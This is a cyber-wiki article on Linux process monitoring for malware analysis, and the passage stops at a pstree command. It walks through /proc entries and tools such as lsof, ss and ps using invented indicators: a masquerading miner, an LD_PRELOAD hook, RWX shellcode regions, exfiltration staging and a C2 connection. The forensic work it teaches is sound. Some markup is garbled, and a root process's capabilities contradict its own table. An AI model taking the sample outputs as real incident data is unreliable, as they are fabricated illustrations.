@@ -1,0 +1,1450 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Process Monitoring | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Process Monitoring">
+		<meta name="keywords" content="forensics, lsof, malware-analysis, process-monitoring, procfs, reverse-engineering">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Process Monitoring">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Monitor running processes through /proc and lsof to detect hidden binaries, executable memory, command-and-control connections, and privilege anomalies.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/reverse-engineering/process-monitoring.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Process Monitoring">
+		<meta name="twitter:description" itemprop="description" content="Monitor running processes through /proc and lsof to detect hidden binaries, executable memory, command-and-control connections, and privilege anomalies.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-observable-process">The Observable Process</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#procpid-the-complete-reference">/proc/PID/: The Complete Reference</a></b>
+					<ul>
+						<li><a href="#cmdline-command-line-arguments">cmdline - Command Line Arguments</a></li>
+						<li><a href="#environ-environment-variables">environ - Environment Variables</a></li>
+						<li><a href="#cwd-current-working-directory">cwd - Current Working Directory</a></li>
+						<li><a href="#exe-executable-symlink">exe - Executable Symlink</a></li>
+						<li><a href="#fd-open-file-descriptors">fd/ - Open File Descriptors</a></li>
+						<li><a href="#maps-memory-mappings">maps - Memory Mappings</a></li>
+						<li><a href="#smaps-detailed-memory">smaps - Detailed Memory</a></li>
+						<li><a href="#status-process-status">status - Process Status</a></li>
+						<li><a href="#stat-process-statistics">stat - Process Statistics</a></li>
+						<li><a href="#statm-memory-summary">statm - Memory Summary</a></li>
+						<li><a href="#io-io-statistics">io - I/O Statistics</a></li>
+						<li><a href="#net-network-connections">net/ - Network Connections</a></li>
+						<li><a href="#task-threads">task/ - Threads</a></li>
+						<li><a href="#ns-namespace-bindings">ns/ - Namespace Bindings</a></li>
+						<li><a href="#cgroup-control-group">cgroup - Control Group</a></li>
+						<li><a href="#attr-selinux-context">attr/ - SELinux Context</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#process-monitoring-tools">Process Monitoring Tools</a></b>
+					<ul>
+						<li><a href="#ps-process-snapshot">ps - Process Snapshot</a></li>
+						<li><a href="#pstree-process-hierarchy">pstree - Process Hierarchy</a></li>
+						<li><a href="#tophtop-live-monitoring">top/htop - Live Monitoring</a></li>
+						<li><a href="#pgrep-pkill">pgrep / pkill</a></li>
+						<li><a href="#lsof-list-open-files">lsof - List Open Files</a></li>
+						<li><a href="#ss-netstat-network-connections">ss / netstat - Network Connections</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#seccomp-mode">Seccomp Mode</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cgroup-context">Cgroup Context</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#uid-and-capability-tracking">UID and Capability Tracking</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#process-profiler-script">Process Profiler Script</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/reverse-engineering/index.html">Reverse Engineering</a></li>
+						<li aria-current="page"><a href="/wiki/articles/reverse-engineering/process-monitoring.html">Process Monitoring</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="process-monitoring">Process Monitoring</h2>
+					<p>
+						Monitor running processes through /proc and lsof to detect hidden binaries, executable memory,
+						command-and-control connections, and privilege anomalies.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							The kernel exposes everything it knows about a running process under
+							<code>/proc</code>
+							. Reading those
+							files from the outside gives a complete view of a suspicious binary without attaching to it
+							or modifying it. This article maps the useful
+							<code>/proc/PID/</code>
+							entries, then turns them into detection
+							signals for hidden binaries, injected code, and outbound command-and-control channels.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - Linux process lifecycle, /proc structure, and process state tracking</li>
+							<li><a href="/wiki/articles/reverse-engineering/tracing.html">System Call Tracing</a> - system call tracing with strace, understanding kernel interactions</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-observable-process">The Observable Process</h3>
+						<p>
+							Everything the kernel knows about a running process is exposed in
+							<code>/proc</code>
+							. This is not debug
+							information or optional metadata - it is the kernel's accounting. Memory mappings, open file
+							descriptors, network sockets, environment variables, namespace bindings, seccomp state. All
+							of it is readable by any process with appropriate permissions.
+						</p>
+						<p>
+							For malware analysis,
+							<code>/proc</code>
+							is a surveillance tool. You monitor a suspicious process from
+							the outside: no code injection, no ptrace attachment, no modification of the target. Pure observation.
+							The malware cannot detect you reading its
+							<code>/proc/PID/</code>
+							files unless it polls them itself - and
+							most malware does not poll
+							<code>/proc/self/</code>
+							for monitoring detection.
+						</p>
+					</section>
+					<section>
+						<h3 id="procpid-the-complete-reference">/proc/PID/: The Complete Reference</h3>
+						<p>
+							Every process has a directory at
+							<code>/proc/PID/</code>
+							. Each file in it exposes a different facet of
+							the process.
+						</p>
+						<h4 id="cmdline-command-line-arguments">cmdline - Command Line Arguments</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/cmdline | tr &#39;\0&#39; &#39; &#39;
+./suspicious.bin --daemon --config /etc/.hidden/config.ini
+						</pre>
+						<p>
+							<code>/proc/PID/cmdline</code>
+							contains the original argv array, null-separated. This is what
+							<code>ps aux</code>
+							displays as the COM
+							<abbr title="Metropolitan Area Network">MAN</abbr>
+							D column.
+						</p>
+						<p>
+							Malware frequently spoofs this: after
+							<code>execve()</code>
+							, the binary can overwrite its own argv in
+							memory. The kernel reads what is in the process's memory at that address - which may not match
+							the actual executable. Checking the command line against the running binary:
+						</p>
+						<pre class="plaintext">
+$ cat /proc/12345/cmdline | tr &#39;\0&#39; &#39; &#39;
+[kworker/u8:2]
+
+$ ls -la /proc/12345/exe
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/exe -&gt; /tmp/.hidden/miner (deleted)
+						</pre>
+						<p>
+							The cmdline says
+							<code>[kworker/u8:2]</code>
+							(a kernel worker). The actual binary is
+							<code>/tmp/.hidden/miner</code>
+							. This process is masquerading as a kernel thread. The
+							<code>(deleted)</code>
+							indicates the binary has
+							been unlinked from disk - self-deleting malware.
+						</p>
+						<h4 id="environ-environment-variables">environ - Environment Variables</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/environ | tr &#39;\0&#39; &#39;\n&#39;
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
+HOME=/root
+LD_PRELOAD=/tmp/.hidden/libhide.so
+SECRET_KEY=deadbeefcafebab3
+USER=root
+						</pre>
+						<p>
+							Environment variables reveal: -
+							<code>LD_PRELOAD</code>
+							: Hooking library - the binary intercepts libc
+							functions. This is a rootkit technique. -
+							<code>SECRET_KEY</code>
+							: Hardcoded key passed through environment
+							<ul>
+								<li>decryption key for payload. - <code>HOME=/root</code> : The binary runs as root. Elevated privileges.</li>
+								<li><code>USER=root</code> : Duplicate information, but confirms context.</li>
+							</ul>
+						</p>
+						<p>
+							Malware uses environment variables as a covert channel: pass data from parent to child without
+							command-line arguments (which appear in
+							<code>ps</code>
+							).
+						</p>
+						<h4 id="cwd-current-working-directory">cwd - Current Working Directory</h4>
+						<pre class="plaintext">
+$ readlink /proc/12345/cwd
+/var/tmp/.cache_3429
+						</pre>
+						<p>
+							The process operates from a hidden directory in
+							<code>/var/tmp</code>
+							. This is where it reads/writes files
+							with relative paths. Combined with opened file descriptors, this reveals the malware's data
+							directory.
+						</p>
+						<h4 id="exe-executable-symlink">exe - Executable Symlink</h4>
+						<pre class="plaintext">
+$ ls -la /proc/12345/exe
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/exe -&gt; /usr/bin/sshd (deleted)
+						</pre>
+						<p>
+							If the symlink ends with
+							<code>(deleted)</code>
+							, the binary was executed and then the file was unlinked.
+							This is self-deleting malware - the binary persists in memory but cannot be found on disk. To
+							recover it:
+						</p>
+						<pre class="plaintext">
+$ cp /proc/12345/exe /tmp/recovered_binary
+$ file /tmp/recovered_binary
+/tmp/recovered_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), stripped
+						</pre>
+						<p>
+							This recovers the binary from memory. Even though the file was unlinked, the kernel keeps the
+							inode alive while the process uses it.
+						</p>
+						<h4 id="fd-open-file-descriptors">fd/ - Open File Descriptors</h4>
+						<pre class="plaintext">
+$ ls -la /proc/12345/fd/
+total 0
+dr-x------ 2 root root  0 Jun 26 10:00 .
+dr-xr-xr-x 9 root root  0 Jun 26 10:00 ..
+lrwx------ 1 root root 64 Jun 26 10:00 0 -&gt; /dev/null
+lrwx------ 1 root root 64 Jun 26 10:00 1 -&gt; /dev/null
+lrwx------ 1 root root 64 Jun 26 10:00 2 -&gt; /dev/null
+lrwx------ 1 root root 64 Jun 26 10:00 3 -&gt; socket:[123456]
+lrwx------ 1 root root 64 Jun 26 10:00 4 -&gt; /tmp/.exfil/data.tar.gz
+lr-x------ 1 root root 64 Jun 26 10:00 5 -&gt; /home/user/Documents/taxes.pdf
+						</pre>
+						<p>
+							What this reveals: - FD 0-2: stdin, stdout, stderr all redirected to
+							<code>/dev/null</code>
+							. Daemonized
+							<ul>
+								<li>no terminal. - FD 3: <code>socket:[123456]</code> - a network socket. The inode number (123456) links to <code>/proc/net/tcp</code> .</li>
+								<li>FD 4: <code>/tmp/.exfil/data.tar.gz</code> - writable file. Staging exfiltrated data.</li>
+								<li>FD 5: <code>/home/user/Documents/taxes.pdf</code> - a user file opened for reading. Being exfiltrated.</li>
+							</ul>
+						</p>
+						<p>The combination of network socket + user file + staging tar = exfiltration in progress.</p>
+						<p>
+							For each FD,
+							<code>fdinfo/</code>
+							gives additional detail:
+						</p>
+						<pre class="plaintext">
+$ cat /proc/12345/fdinfo/4
+pos:    1048576
+flags:  0100001
+mnt_id: 25
+						</pre>
+						<p>Position 1,048,576 bytes - the binary has already written 1 MB to the staging file.</p>
+						<h4 id="maps-memory-mappings">maps - Memory Mappings</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/maps
+555555554000-555555557000 r-xp 00000000 08:01 524289  /tmp/.hidden/miner (deleted)
+555555756000-555555757000 r--p 00002000 08:01 524289  /tmp/.hidden/miner (deleted)
+555555757000-555555758000 rw-p 00003000 08:01 524289  /tmp/.hidden/miner (deleted)
+7f1234000000-7f1234021000 rw-p 00000000 00:00 0        [heap]
+7f1238000000-7f1238005000 r-xp 00000000 08:01 131072  /usr/lib/libc.so.6
+7f1238005000-7f1238204000 ---p 00005000 08:01 131072  /usr/lib/libc.so.6
+7f1238204000-7f1238208000 r--p 00004000 08:01 131072  /usr/lib/libc.so.6
+7f1238208000-7f1238209000 rw-p 00008000 08:01 131072  /usr/lib/libc.so.6
+7f1238209000-7f1238211000 rw-p 00000000 00:00 0
+7f1239000000-7f1239001000 rwxp 00000000 00:00 0        [anonymous]
+7f1239001000-7f1239100000 rw-p 00000000 00:00 0        [anonymous]
+7ffff7e00000-7ffff7e01000 rw-p 00000000 00:00 0        [stack]
+						</pre>
+						<p>
+							Each line:
+							<code>address perms offset dev inode path</code>
+							.
+						</p>
+						<p>
+							Critical observations: -
+							<b>RWX anonymous mapping</b>
+							:
+							<code>rwxp</code>
+							at
+							<code>7f1239000000-7f1239001000</code>
+							-
+							anonymous memory (not backed by a file) with read, write, and execute permissions. This is where
+							shellcode or an unpacked payload lives. The
+							<code>p</code>
+							(private) flag means changes are not written
+							back to any file. -
+							<b>Deleted executable</b>
+							: The executable at
+							<code>555555554000</code>
+							has
+							<code>(deleted)</code>
+							<ul>
+								<li>confirmed self-deleting. - <b>Stack without execute</b> : <code>rw-p</code> on <code>[stack]</code> - NX bit active. Normal.</li>
+								<li><b>Large anonymous rw-p regions</b> : The region at <code>7f1239001000-7f1239100000</code> is~1 MB of writable anonymous memory. Buffer for network data or crypto operations.</li>
+								<li><b>Libraries</b> : <code>libc.so.6</code> mapped with proper permissions (r-xp for code, r--p for rodata, rw-p for data). Normal.</li>
+							</ul>
+						</p>
+						<p>To find all anonymous executable regions (commonly shellcode):</p>
+						<pre class="plaintext">
+$ grep &#39;rwxp.*anonymous&#39; /proc/12345/maps
+7f1239000000-7f1239001000 rwxp 00000000 00:00 0        [anonymous]
+7f123a000000-7f123a002000 rwxp 00000000 00:00 0        [anonymous]
+						</pre>
+						<p>Two RWX anonymous regions. The second is 8 KB - likely a second-stage payload.</p>
+						<h4 id="smaps-detailed-memory">smaps - Detailed Memory</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/smaps
+						</pre>
+						<p>
+							smaps extends
+							<code>maps</code>
+							with accounting: RSS (resident set size), PSS (proportional), swap, and
+							mapping flags. For malware analysis, watch for large RSS in anonymous regions - that is heap
+							data, extracted configs, or stolen data buffered in memory.
+						</p>
+						<h4 id="status-process-status">status - Process Status</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/status
+Name:   suspicious.bin
+Umask:  0022
+State:  S (sleeping)
+Tgid:   12345
+Ngid:   0
+Pid:    12345
+PPid:   1
+TracerPid:      0
+Uid:    0       0       0       0
+Gid:    0       0       0       0
+FDSize: 64
+Groups: 0
+NStgid: 12345
+NSpid:  12345
+NSpgid: 12345
+NSsid:  12345
+VmPeak:    24576 kB
+VmSize:    24576 kB
+VmLck:         0 kB
+VmPin:         0 kB
+VmHWM:      2936 kB
+VmRSS:      2936 kB
+RssAnon:     1204 kB
+RssFile:     1732 kB
+RssShmem:       0 kB
+VmData:      308 kB
+VmStk:       132 kB
+VmExe:       108 kB
+VmLib:      1732 kB
+VmPTE:       120 kB
+VmSwap:        0 kB
+Threads:    5
+SigQ:   0/62972
+SigPnd: 0000000000000000
+ShdPnd: 0000000000000000
+SigBlk: 0000000000000000
+SigIgn: 0000000000000000
+SigCgt: 0000000000000000
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+Seccomp:        2
+Seccomp_filters:        1
+Speculation_Store_Bypass:       thread vulnerable
+SpeculationIndirectBranch:  mitigation disabled
+Cpus_allowed:   ff
+Cpus_allowed_list:      0-7
+Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000
+Mems_allowed_list:      0
+voluntary_ctxt_switches:        15
+nonvoluntary_ctxt_switches:     42
+						</pre>
+						<p>Critical fields for malware analysis:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Field</th>
+									<th align="center">Normal</th>
+									<th align="center">Suspicious</th>
+									<th align="center">Why</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>PPid</code></td>
+									<td align="center">User's shell or init</td>
+									<td align="center">1 (init)</td>
+									<td align="center">Daemonized - parent exited, adopted by init. The malware detached from the terminal.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>TracerPid</code></td>
+									<td align="center">0</td>
+									<td align="center">Non-zero</td>
+									<td align="center">Process is being traced by PID X. Could be a debugger, could be ptrace-based injection.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Uid</code></td>
+									<td align="center">User's UID</td>
+									<td align="center">0 0 0 0 (root)</td>
+									<td align="center">Running as root. If the binary should not be root, this is privilege escalation.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Threads</code></td>
+									<td align="center">1-2</td>
+									<td align="center">10+</td>
+									<td align="center">Multi-threaded operation - C2 handler, keylogger, crypto, each in separate threads.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Seccomp</code></td>
+									<td align="center">0</td>
+									<td align="center">1 or 2</td>
+									<td align="center">Seccomp strict (1) or filter (2). The binary uses seccomp for sandboxing or restricting itself.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>VmRSS</code></td>
+									<td align="center">Proportional</td>
+									<td align="center">Very large RSS with small VmExe</td>
+									<td align="center">The binary maps executable code that is not from the binary itself - shellcode or unpacked payload.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>CapEff</code></td>
+									<td align="center">0000000000000000 for unprivileged users, full set for root</td>
+									<td align="center">CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_NET_RAW</td>
+									<td align="center">Kernel module loading, raw sockets, ptrace - suspicious capabilities.</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="stat-process-statistics">stat - Process Statistics</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/stat
+12345 (suspicious.bi) S 1 12345 12345 0 -1 4194304 734 0 0 0 0 0 0 0 20 0 5 0 25165824 3006464 368 18446744073709551615 93824995966976 93824995969000 140722665431184 0 0 0 0 0 0 0 0 0 17 4 0 0 0 0 0 93824995971120 93824995971192 93824995989504 140722665434591 140722665434596 140722665434596 140722665435633 0
+						</pre>
+						<p>
+							Key fields: - Field 3 (State):
+							<code>S</code>
+							= sleeping,
+							<code>R</code>
+							= running,
+							<code>Z</code>
+							= zombie,
+							<code>T</code>
+							= stopped,
+							<code>D</code>
+							= uninterruptible sleep. - Field 14 (utime) and 15 (stime):
+							<abbr title="Central Processing Unit">CPU</abbr>
+							time
+							in user and kernel mode (jiffies). High values =
+							<abbr title="Central Processing Unit">CPU</abbr>
+							-bound malware
+							(cryptominer). - Field 24 (rss): Resident set size in pages. Multiply by 4 KB for RSS in bytes.
+							<ul>
+								<li>Field 25 (rsslim): RSS limit. Unusually small limit = self-restriction to avoid detection.</li>
+							</ul>
+						</p>
+						<h4 id="statm-memory-summary">statm - Memory Summary</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/statm
+6144 734 368 108 0 132 0
+						</pre>
+						<p>Seven fields (in pages):</p>
+						<ol>
+							<li>Total program size (6144 pages = 24 MB)</li>
+							<li>Resident set size (734 pages =~2.9 MB)</li>
+							<li>Shared pages (368 pages =~1.4 MB)</li>
+							<li>Text/code (108 pages = 432 KB) - small code = minimal binary or packed stub</li>
+							<li>Library (0 pages - statically linked or library not counted)</li>
+							<li>Data + stack (132 pages = 528 KB)</li>
+							<li>Dirty pages (0 - nothing modified in memory)</li>
+						</ol>
+						<p>
+							The small text size (432 KB) with large total size (24 MB) means the binary allocates far more
+							memory than the executable itself occupies. This is suspicious - the extra memory is for payload,
+							network buffers, or stolen data.
+						</p>
+						<h4 id="io-io-statistics">io - I/O Statistics</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/io
+rchar: 45678901
+wchar: 12345678
+syscr: 8923
+syscw: 3456
+read_bytes: 45678592
+write_bytes: 12341248
+cancelled_write_bytes: 0
+						</pre>
+						<ul>
+							<li><code>read_bytes</code> : Total bytes read from storage. 44 MB - if the binary is small, it is reading other files.</li>
+							<li><code>write_bytes</code> : Total bytes written to storage. 12 MB - data exfiltration to a local staging file, or encryption output.</li>
+							<li><code>syscr</code> vs <code>syscw</code> : 8923 read syscalls vs 3456 write syscalls. More reads than writes - data theft.</li>
+						</ul>
+						<h4 id="net-network-connections">net/ - Network Connections</h4>
+						<pre class="plaintext">
+$ ls /proc/12345/net/
+anycast6      if_inet6      ip_tables_matches  nfsfs      sockstat     tcp       udplite
+arp           igmp          mcfilter           packet     sockstat6    tcp6      unix
+connector     igmp6         mcfilter6          protocols  softnet_stat udp       wireless
+dev           ip6_flowlabel netfilter          psched     stat         udp6
+dev_mcast     ip6_mr_cache  netlink            ptype      tcp          udp6
+						</pre>
+						<p>For malware, the key files:</p>
+						<pre class="plaintext">
+$ cat /proc/12345/net/tcp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
+   0: 0F02000A:E52B 4E38220C:1F90 01 00000000:00000000 00:00000000 00000000     0        0 123456 1 0000000000000000 100 0 0 10 0
+   1: 0F02000A:E52C 0100007F:1F90 01 00000000:00000000 00:00000000 00000000     0        0 123457 1 0000000000000000 100 0 0 10 0
+						</pre>
+						<p>
+							Decode: - Local address
+							<code>0F02000A:E52B</code>
+							:
+							<abbr title="Internet Protocol">IP</abbr>
+							
+							<code>10.0.2.15</code>
+							, port
+							<code>58667</code>
+							(hex reverse: E52B = 58667). - Remote address
+							<code>4E38220C:1F90</code>
+							:
+							<abbr title="Internet Protocol">IP</abbr>
+							
+							<code>12.34.56.78</code>
+							, port
+							<code>8080</code>
+							. - State
+							<code>01</code>
+							= ESTABLISHED. - inode
+							<code>123456</code>
+							- links to
+							<code>/proc/12345/fd/3 -&gt; socket:[123456]</code>
+							.
+						</p>
+						<p>
+							The process has an established
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							connection to
+							<code>12.34.56.78:8080</code>
+							. This is the
+							<abbr title="Command and Control">C2</abbr>
+							channel.
+						</p>
+						<p>
+							Second entry: local
+							<code>10.0.2.15:58668</code>
+							to remote
+							<code>127.0.0.1:8080</code>
+							. A localhost proxy or backconnect
+							listener.
+						</p>
+						<p>
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							connections:
+						</p>
+						<pre class="plaintext">
+$ cat /proc/12345/net/udp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
+   0: 00000000:0035 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 123458 2 0000000000000000 100 0 0 10 0
+						</pre>
+						<p>
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							port 53 (0x0035) -
+							<abbr title="Domain Name System">DNS</abbr>
+							listener or
+							<abbr title="Domain Name System">DNS</abbr>
+							exfiltration.
+						</p>
+						<p>Command-line tools for network inspection:</p>
+						<pre class="plaintext">
+$ ss -tnp | grep 12345
+ESTAB  0  0  10.0.2.15:58667  12.34.56.78:8080  users:((&#34;suspicious.bi&#34;,pid=12345,fd=3))
+
+$ lsof -i -a -p 12345
+COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+suspicious 12345 root    3u  IPv4 123456      0t0  TCP 10.0.2.15:58667-&gt;12.34.56.78:8080 (ESTABLISHED)
+suspicious 12345 root    4u  IPv4 123457      0t0  TCP 10.0.2.15:58668-&gt;127.0.0.1:8080 (ESTABLISHED)
+						</pre>
+						<h4 id="task-threads">task/ - Threads</h4>
+						<pre class="plaintext">
+$ ls /proc/12345/task/
+12345  12346  12347  12348  12349
+						</pre>
+						<p>
+							Five threads. Each has its own
+							<code>/proc/PID/task/TID/</code>
+							directory with per-thread stats,
+							<abbr title="Central Processing Unit">CPU</abbr>
+							usage, and scheduling info. A thread consuming 100%
+							<abbr title="Central Processing Unit">CPU</abbr>
+							while others
+							are idle indicates a crypto-miner thread.
+						</p>
+						<pre class="plaintext">
+$ cat /proc/12345/task/12346/status | grep -E &#39;State|VmRSS&#39;
+State:  R (running)
+VmRSS:  412 kB
+						</pre>
+						<p>
+							Thread 12346 is actively running (state
+							<code>R</code>
+							). While the main thread (12345) is sleeping. This
+							thread is the active component - likely the
+							<abbr title="Command and Control">C2</abbr>
+							loop or crypto worker.
+						</p>
+						<h4 id="ns-namespace-bindings">ns/ - Namespace Bindings</h4>
+						<pre class="plaintext">
+$ ls -la /proc/12345/ns/
+total 0
+dr-x--x--x 2 root root 0 Jun 26 10:00 .
+dr-xr-xr-x 9 root root 0 Jun 26 10:00 ..
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 cgroup -&gt; &#39;cgroup:[4026531835]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 ipc -&gt; &#39;ipc:[4026531839]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 mnt -&gt; &#39;mnt:[4026531841]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 net -&gt; &#39;net:[4026531840]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 pid -&gt; &#39;pid:[4026531836]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 user -&gt; &#39;user:[4026531837]&#39;
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 uts -&gt; &#39;uts:[4026531838]&#39;
+						</pre>
+						<p>
+							Compare namespace inodes with another process. If they differ, the process is in a container
+							or isolated namespace. A malware process in a container namespace suggests it was launched from
+							a container escape attempt or it is testing container boundaries.
+						</p>
+						<h4 id="cgroup-control-group">cgroup - Control Group</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/cgroup
+0::/system.slice/docker-abc123.scope
+						</pre>
+						<p>
+							The cgroup path reveals: -
+							<code>/docker-abc123.scope</code>
+							: Process runs inside a Docker container.
+							Container escape scenario. -
+							<code>/system.slice/sshd.service</code>
+							: Process is an
+							<abbr title="Secure Shell">SSH</abbr>
+							daemon child - legitimate. -
+							<code>/user.slice/user-1000.slice/session-3.scope</code>
+							: User session process.
+						</p>
+						<p>
+							Malware running in
+							<code>/user.slice/</code>
+							with strange names (like
+							<code>kworker</code>
+							or
+							<code>[kthreadd]</code>
+							) and a
+							binary path pointing to
+							<code>/tmp</code>
+							is suspicious. Legitimate kernel workers are in kernel cgroups.
+						</p>
+						<h4 id="attr-selinux-context">attr/ - SELinux Context</h4>
+						<pre class="plaintext">
+$ cat /proc/12345/attr/current
+unconfined_u:unconfined_r:unconfined_t:s0
+						</pre>
+						<p>
+							SELinux context. If the binary is confined (non-
+							<code>unconfined_t</code>
+							), SELinux is enforcing restrictions
+							<ul>
+								<li>the malware's capabilities are limited by policy.</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h3 id="process-monitoring-tools">Process Monitoring Tools</h3>
+						<h4 id="ps-process-snapshot">ps - Process Snapshot</h4>
+						<pre class="plaintext">
+$ ps aux | grep -E &#39;PID|12345&#39;
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root     12345  0.2  0.3  24576  2936 ?        Ssl  10:00   0:04 ./suspicious.bin
+						</pre>
+						<p>
+							Key columns: -
+							<code>STAT</code>
+							: Process state.
+							<code>S</code>
+							= sleeping (interruptible),
+							<code>s</code>
+							= session leader,
+							<code>l</code>
+							= multi-threaded.
+							<code>Ssl</code>
+							= sleeping session leader with threads. -
+							<code>VSZ</code>
+							: Virtual memory
+							size (24 MB). -
+							<code>RSS</code>
+							: Resident physical memory (2.9 MB). -
+							<code>START</code>
+							: Start time. Useful for correlating with incident timelines.
+						</p>
+						<p>Custom ps format for malware analysis:</p>
+						<pre class="plaintext">
+$ ps -eo pid,ppid,user,rss,vsz,stat,start,time,args
+						</pre>
+						<pre class="plaintext">
+$ ps -eo pid,ppid,user,rss,vsz,stat,args --sort=-%mem | head -20
+						</pre>
+						<p>Top 20 by memory usage. Crypto-miners and data exfiltration tools use large RSS.</p>
+						<h4 id="pstree-process-hierarchy">pstree - Process Hierarchy</h4>
+						<pre class="plaintext">
+$ pstree -p 12345
+suspicious.bin(12345)─+─curl(12346)
+                       ├─bash(12347)───nmap(12348)
+                       ├─{suspicious.b}(12349)
+                       └─{suspicious.b}(12350)
+						</pre>
+						<p>
+							The binary forked three children: -
+							<code>curl(12346)</code>
+							: Data exfiltration or payload download. -
+							<code>bash(12347)</code>
+							with child
+							<code>nmap(12348)</code>
+							: Script-based network scanning. - Two threads
+							<code>{suspicious.b}</code>
+							: Internal concurrency.
+						</p>
+						<p>
+							The combination curl + nmap + threads = a botnet node doing reconnaissance and exfiltration
+							simultaneously.
+						</p>
+						<pre class="plaintext">
+$ pstree -ap 12345
